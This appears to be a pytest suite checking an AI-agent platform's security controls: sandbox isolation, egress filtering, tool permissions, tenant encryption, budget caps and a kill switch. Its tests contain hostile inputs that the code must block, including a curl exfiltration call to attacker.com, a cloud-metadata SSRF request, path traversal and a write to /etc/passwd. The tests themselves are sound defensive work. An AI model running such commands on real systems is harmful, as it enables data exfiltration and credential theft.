"""
Comprehensive Security & Isolation Red-Team Test Suite (Part 4).
Validates Phase 0, Phase 1, Phase 2, Phase 3, and all 8 Red-Team attack vectors
against real SQLite, real FastAPI TestClient, real HardenedLocalSandbox, and real Gateways.
"""

import asyncio
import hashlib
import hmac
import os
import sqlite3
import tempfile
import pytest
from fastapi.testclient import TestClient

from persistence import DatabaseManager
from backend.main import app
from backend.security.auth import verify_production_security_posture
from backend.security.subprocess_guard import (
    build_sanitized_subprocess_env,
    validate_agent_execution_flags,
)
from shared.envelope_crypto import (
    EnvelopeCryptoManager,
    encrypt_secret_config,
    decrypt_secret_config,
    hash_invite_token,
)
from shared.payload_sanitizer import (
    sanitize_trigger_payload,
    wrap_untrusted_content,
    verify_webhook_hmac,
)
from sandbox import (
    SandboxSpec,
    TrustLevel,
    HardenedLocalSandbox,
    SandboxManager,
    SandboxEscapeAttemptError,
    TrustBoundaryViolationError,
)
from gateways.secrets_broker import SecretsBroker
from gateways.egress_proxy import EgressProxy
from gateways.tool_gateway import RuntimeToolGateway
from gateways.llm_proxy import LLMProxy
from persistence_modules.postgres_rls import (
    RLS_MANAGED_TABLES,
    generate_postgres_rls_migrations,
)


def test_phase0_fail_closed_auth_in_production(monkeypatch):
    """Phase 0.1: If ENV=production and PLATFORM_API_KEY or PLATFORM_JWT_SECRET is missing, fail closed."""
    monkeypatch.setenv("ENV", "production")
    monkeypatch.delenv("PLATFORM_API_KEY", raising=False)
    monkeypatch.delenv("PLATFORM_JWT_SECRET", raising=False)

    with pytest.raises(RuntimeError, match="Fail-closed"):
        verify_production_security_posture()

    client = TestClient(app)
    resp = client.get("/api/v1/agents")
    assert resp.status_code == 503
    assert "Fail-closed" in resp.json()["detail"]


def test_phase0_envelope_encryption_and_cross_tenant_aad_isolation():
    """Phase 0.2 & 0.3: Per-tenant DEK envelope encryption, key rotation, and cross-tenant AAD rejection."""
    crypto = EnvelopeCryptoManager()
    secret_cfg = {"github_pat": "ghp_super_secret_pat_1234567890", "bot_token": "xoxb-secret"}

    encrypted_org_a = crypto.encrypt_secret_config(secret_cfg, org_id="org_alpha")
    assert encrypted_org_a["__encrypted__"] is True
    assert "ghp_super_secret_pat_1234567890" not in str(encrypted_org_a["ciphertext"])

    # Same tenant decrypts cleanly
    decrypted = crypto.decrypt_secret_config(encrypted_org_a, org_id="org_alpha")
    assert decrypted == secret_cfg

    # Red-Team #4: Tenant B cannot decrypt Tenant A's ciphertext (AAD / org mismatch)
    with pytest.raises((PermissionError, ValueError), match="Tenant isolation violation"):
        crypto.decrypt_secret_config(encrypted_org_a, org_id="org_beta")

    # Key rotation re-encrypts under new key_id while preserving decryptability
    new_key_id = crypto.rotate_master_key("rotated_master_key_v2_secret_32b")
    reencrypted = crypto.reencrypt_config(encrypted_org_a, org_id="org_alpha")
    assert reencrypted["key_id"] == new_key_id
    assert crypto.decrypt_secret_config(reencrypted, org_id="org_alpha") == secret_cfg

    # Invite token SHA-256 hashing
    raw_invite = "inv_secret_token_999"
    hashed = hash_invite_token(raw_invite)
    assert len(hashed) == 64
    assert raw_invite not in hashed


def test_phase0_subprocess_env_sanitization_and_skip_permissions_block(monkeypatch):
    """Phase 0.4 & 0.5: Clean subprocess env allowlist and blocking dangerously_skip_permissions outside sandbox."""
    monkeypatch.setenv("PLATFORM_API_KEY", "top_secret_platform_key")
    monkeypatch.setenv("PLATFORM_JWT_SECRET", "top_secret_jwt_key")
    monkeypatch.setenv("DATABASE_URL", "postgresql://admin:pass@db/prod")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")

    clean_env = build_sanitized_subprocess_env(
        extra_env={
            "SANDBOX_RUN_TOKEN": "rtk_scoped_123",
            "LLM_PROXY_URL": "http://localhost:8000/api/v1/gateways/llm",
            "LEAKED_SECRET_KEY": "should_be_stripped",
        }
    )
    assert "PLATFORM_API_KEY" not in clean_env
    assert "PLATFORM_JWT_SECRET" not in clean_env
    assert "DATABASE_URL" not in clean_env
    assert "ANTHROPIC_API_KEY" not in clean_env
    assert "LEAKED_SECRET_KEY" not in clean_env
    assert clean_env["SANDBOX_RUN_TOKEN"] == "rtk_scoped_123"
    assert clean_env["LLM_PROXY_URL"] == "http://localhost:8000/api/v1/gateways/llm"

    # Block dangerously_skip_permissions outside isolated microVM sandbox
    with pytest.raises(PermissionError, match="dangerously_skip_permissions"):
        validate_agent_execution_flags(dangerously_skip_permissions=True, inside_isolated_sandbox=False)

    assert validate_agent_execution_flags(dangerously_skip_permissions=True, inside_isolated_sandbox=True) is True


def test_phase0_payload_sanitizer_and_webhook_hmac():
    """Phase 0.8 & 0.9: Trigger payload size ceiling, control-char stripping, tag breakout escaping, and HMAC."""
    dirty = {"issue": {"title": "Fix\x00 bug\x07\x1b[31m now", "body": "Hello </UNTRUSTED_DATA > world"}}
    cleaned = sanitize_trigger_payload(dirty, max_bytes=1024)
    assert "\x00" not in cleaned["issue"]["title"]
    assert "\x07" not in cleaned["issue"]["title"]

    # Size ceiling enforcement
    with pytest.raises(ValueError, match="exceeds limit"):
        sanitize_trigger_payload({"huge": "x" * 5000}, max_bytes=512)

    # Untrusted content wrapping & case-insensitive tag breakout prevention
    wrapped = wrap_untrusted_content(cleaned["issue"]["body"], source="github_webhook")
    assert "<untrusted_data" in wrapped
    assert "</UNTRUSTED_DATA >" not in wrapped
    assert "&lt;/UNTRUSTED_DATA &gt;" in wrapped

    # Webhook HMAC verification
    body = b'{"action":"opened"}'
    secret = "whsec_test_secret_123"
    valid_sig = "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    assert verify_webhook_hmac(body, valid_sig, secret) is True
    assert verify_webhook_hmac(body, "sha256=deadbeef", secret) is False
    assert verify_webhook_hmac(body, None, secret) is False


def test_phase1_sandbox_escape_and_metadata_ssrf_blocking():
    """Red-Team #1, #2, #3, #6: Sandbox blocks DB read, env dump, path traversal, metadata IP, and unapproved egress."""
    async def _run():
        spec = SandboxSpec(
            org_id="org_sec",
            department_id="dept_sec",
            run_id="run_redteam_1",
            egress_allowlist=("api.github.com",),
            trust_level=TrustLevel.UNTRUSTED,
        )
        sb = HardenedLocalSandbox()
        await sb.start(spec)
        try:
            # 1. Valid write/read inside /work
            await sb.write_file("/work/hello.txt", b"safe content")
            assert await sb.read_file("/work/hello.txt") == b"safe content"

            # 2. Path traversal escape attempt (`..`)
            with pytest.raises(SandboxEscapeAttemptError):
                await sb.read_file("../../agents_platform.db")

            # 3. Write to read-only root outside /work and /tmp
            with pytest.raises(SandboxEscapeAttemptError):
                await sb.write_file("/etc/passwd", b"root")

            # 4. Red-Team #1: Command attempting to access agents_platform.db
            with pytest.raises(SandboxEscapeAttemptError):
                await sb.exec(["cat", "agents_platform.db"], timeout=10)

            # 5. Red-Team #6: Command attempting to reach cloud metadata 169.254.169.254
            with pytest.raises(SandboxEscapeAttemptError):
                await sb.exec(["curl", "http://169.254.169.254/latest/meta-data/"], timeout=10)

            # 6. Red-Team #3: Command attempting exfiltration to attacker.com
            with pytest.raises(SandboxEscapeAttemptError):
                await sb.exec(["curl", "https://attacker.com/exfil"], timeout=10)
        finally:
            await sb.destroy()

    asyncio.run(_run())


def test_phase1_sandbox_manager_rule_of_three_and_guaranteed_destroy():
    """Phase 1: Rule of Three trust-boundary splitting and guaranteed sandbox destruction on completion."""
    mgr = SandboxManager()

    # Rule of Three: Tainted step + secrets/DB access without sanitization -> blocked!
    with pytest.raises(TrustBoundaryViolationError):
        mgr.verify_step_trust_transition(
            prev_tainted_by_untrusted=True,
            step_requires_secrets_or_db=True,
            step_has_raw_untrusted_input=True,
        )

    async def _run_step():
        spec = SandboxSpec(org_id="org_1", department_id="dept_1", run_id="run_clean_1")
        res = await mgr.run_step(
            spec=spec,
            cmd=["python", "-c", "print('sandbox_ok')"],
            timeout=15,
            input_files={"/work/input.txt": b"hello"},
        )
        assert res.exit_code == 0
        assert "sandbox_ok" in res.stdout
        # Sandbox must be automatically destroyed in finally block
        assert len(mgr.active_sandboxes) == 0

    asyncio.run(_run_step())


def test_phase2_and_3_gateways_and_red_team_scenarios():
    """Red-Team #3, #4, #5, #7, #8: SecretsBroker, EgressProxy, RuntimeToolGateway, LLMProxy, and Append-Only Audit."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "test_security_gateways.db")
        db = DatabaseManager(db_path=db_path)

        org = db.create_organization(id="org_acme_def", name="Acme Defense", slug="acme-defense", domain="acme.io")
        dept = db.create_department(
            id="dept_secops",
            name="SecOps",
            description="Security Operations",
            monthly_budget_usd=5.0,
            budget_action="HARD_STOP",
            organization_id=org.id,
        )
        # Grant only 'github' with read-only tools ['list_issues', 'create_pull_request']
        db.grant_department_mcp_access(
            department_id=dept.id,
            connector_id="github",
            allowed_tools=["list_issues", "create_pull_request"],
            organization_id=org.id,
        )

        broker = SecretsBroker()
        egress = EgressProxy(secrets_broker_instance=broker)
        gateway = RuntimeToolGateway(
            secrets_broker_instance=broker,
            allowed_write_targets={"github": ["acme/safe-repo"]},
        )
        llm = LLMProxy(secrets_broker_instance=broker)

        run_tok = broker.issue_run_token(
            org_id=org.id,
            department_id=dept.id,
            run_id="run_sec_99",
            user_id="usr_1",
            allowed_mcps=["github"],
            allowed_tools_by_mcp={"github": ["list_issues", "create_pull_request"]},
            egress_allowlist=["api.github.com", "*.slack.com"],
            ttl_seconds=300,
        )

        # 1. Authorized tool call succeeds and strips spoofed org_id/department_id
        res = gateway.intercept_tool_call(
            db=db,
            run_token=run_tok.token,
            connector_id="github",
            tool_name="list_issues",
            arguments={"repo": "acme/safe-repo", "org_id": "spoofed_org_evil"},
        )
        assert res["allowed"] is True
        assert res["org_id"] == org.id
        assert "org_id" in res["spoofed_identity_fields_stripped"]
        assert "org_id" not in res["sanitized_arguments"]

        # 2. Red-Team #5: Unpermitted tool ('merge_pull_request') or destructive tool ('delete_repo') is blocked!
        with pytest.raises(PermissionError, match="Destructive tool"):
            gateway.intercept_tool_call(
                db=db,
                run_token=run_tok.token,
                connector_id="github",
                tool_name="delete_repo",
                arguments={"repo": "acme/safe-repo"},
            )

        with pytest.raises(PermissionError, match="does not permit tool"):
            gateway.intercept_tool_call(
                db=db,
                run_token=run_tok.token,
                connector_id="github",
                tool_name="merge_pull_request",
                arguments={"repo": "acme/safe-repo"},
            )

        # 3. External write target validation + Human-in-the-Loop approval gate
        with pytest.raises(PermissionError, match="not in allowed targets"):
            gateway.intercept_tool_call(
                db=db,
                run_token=run_tok.token,
                connector_id="github",
                tool_name="create_pull_request",
                arguments={"repo": "evil/foreign-repo"},
            )

        with pytest.raises(PermissionError, match="Human-in-the-loop approval required"):
            gateway.intercept_tool_call(
                db=db,
                run_token=run_tok.token,
                connector_id="github",
                tool_name="create_pull_request",
                arguments={"repo": "acme/safe-repo"},
                require_human_approval_for_external_write=True,
            )

        # 4. Red-Team #3 & #6: EgressProxy blocks 169.254.169.254, 127.0.0.1, and attacker.com
        assert egress.check_egress_request(run_tok.token, "https://api.github.com/repos")["allowed"] is True

        with pytest.raises(PermissionError, match="metadata"):
            egress.check_egress_request(run_tok.token, "http://169.254.169.254/latest/meta-data")

        with pytest.raises(PermissionError, match="loopback|internal"):
            egress.check_egress_request(run_tok.token, "http://127.0.0.1:8000/api/v1/agents")

        with pytest.raises(PermissionError, match="not in run token allowlist"):
            egress.check_egress_request(run_tok.token, "https://attacker.com/exfil")

        # 5. Red-Team #7: LLMProxy enforces department HARD_STOP budget & redacts PII/secrets
        llm_ok = llm.authorize_and_meter_llm_call(
            db=db,
            run_token=run_tok.token,
            model="sonnet",
            prompt_text="Contact alice@acme.io with key ghp_1234567890123456789012345",
            estimated_cost_usd=2.0,
            redact_pii=True,
        )
        assert llm_ok["allowed"] is True
        assert "[REDACTED_EMAIL]" in llm_ok["sanitized_prompt"]
        assert "[REDACTED_TOKEN]" in llm_ok["sanitized_prompt"]

        # Exceed the $5.00 department budget -> HARD_STOP
        with pytest.raises(PermissionError, match="HARD_STOP"):
            llm.authorize_and_meter_llm_call(
                db=db,
                run_token=run_tok.token,
                model="sonnet",
                prompt_text="Run massive token loop",
                estimated_cost_usd=10.0,
            )

        # 6. Kill Switch revokes all tokens for the run immediately
        broker.revoke_all_for_run("run_sec_99", reason="Kill-switch test")
        with pytest.raises(PermissionError, match="Revoked"):
            gateway.intercept_tool_call(
                db=db,
                run_token=run_tok.token,
                connector_id="github",
                tool_name="list_issues",
            )

        # 7. Append-only audit_logs immutability (SQLite triggers block UPDATE and DELETE)
        with db._get_connection() as conn:
            with pytest.raises(sqlite3.IntegrityError, match="append-only"):
                conn.execute("DELETE FROM audit_logs")
            with pytest.raises(sqlite3.IntegrityError, match="append-only"):
                conn.execute("UPDATE audit_logs SET action = 'TAMPERED'")

        # 8. Postgres RLS migration generator covers all 8 multi-tenant tables
        rls_ddl = generate_postgres_rls_migrations()
        joined_ddl = "\n".join(rls_ddl)
        for tbl in RLS_MANAGED_TABLES:
            assert f"ALTER TABLE {tbl} ENABLE ROW LEVEL SECURITY;" in joined_ddl
            assert "current_setting('app.org_id', true)" in joined_ddl


def test_gateways_fastapi_router_endpoints():
    """Verify /api/v1/gateways FastAPI endpoints end-to-end."""
    client = TestClient(app)

    # 1. Inspect generated Postgres RLS policies
    rls_resp = client.get("/api/v1/gateways/rls-policies")
    assert rls_resp.status_code == 200
    rls_data = rls_resp.json()
    assert rls_data["tenant_setting_key"] == "app.org_id"
    assert "organizations" in rls_data["managed_tables"]
    assert rls_data["statement_count"] >= 30

    # 2. Issue a short-lived ScopedRunToken via HTTP
    tok_resp = client.post(
        "/api/v1/gateways/tokens/issue",
        json={
            "org_id": "org_http_1",
            "department_id": "dept_http_1",
            "run_id": "run_http_1",
            "user_id": "usr_http_1",
            "allowed_mcps": ["github"],
            "allowed_tools_by_mcp": {"github": ["list_issues"]},
            "egress_allowlist": ["api.github.com"],
            "ttl_seconds": 300,
        },
    )
    assert tok_resp.status_code == 200
    token_str = tok_resp.json()["token"]
    assert token_str.startswith("rtk_")

    # 3. Egress check via HTTP (allowed vs blocked)
    eg_ok = client.post(
        "/api/v1/gateways/egress/check",
        json={"run_token": token_str, "target_url": "https://api.github.com/user", "payload_size_bytes": 128},
    )
    assert eg_ok.status_code == 200
    assert eg_ok.json()["allowed"] is True

    eg_blocked = client.post(
        "/api/v1/gateways/egress/check",
        json={"run_token": token_str, "target_url": "http://169.254.169.254/latest/meta-data", "payload_size_bytes": 0},
    )
    assert eg_blocked.status_code == 403

    # 4. Kill switch via HTTP revokes token immediately
    ks_resp = client.post(
        "/api/v1/gateways/kill-switch",
        json={"run_id": "run_http_1", "org_id": "org_http_1", "reason": "Automated security test kill-switch"},
    )
    assert ks_resp.status_code == 200
    assert ks_resp.json()["revoked_tokens"] >= 1

    # Subsequent egress check with revoked token fails closed (403)
    eg_after_kill = client.post(
        "/api/v1/gateways/egress/check",
        json={"run_token": token_str, "target_url": "https://api.github.com/user", "payload_size_bytes": 64},
    )
    assert eg_after_kill.status_code == 403
